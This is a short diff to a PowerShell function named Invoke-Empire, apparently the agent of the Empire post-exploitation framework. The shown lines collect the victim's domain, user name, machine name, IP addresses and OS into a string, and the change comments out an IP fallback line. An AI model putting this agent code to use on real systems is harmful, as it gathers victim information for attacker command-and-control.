@@ -222,7 +222,7 @@ function Invoke-Empire {
         $str += '|' + [Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
         $p = (Get-WmiObject Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);
         $ip = @{$true=$p[0];$false=$p}[$p.Length -lt 6];
-        if(!$ip -or $ip.trim() -eq '') {$ip='0.0.0.0'};
+        #if(!$ip -or $ip.trim() -eq '') {$ip='0.0.0.0'};
         $str+="|$ip"
 
         $str += '|' +(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];
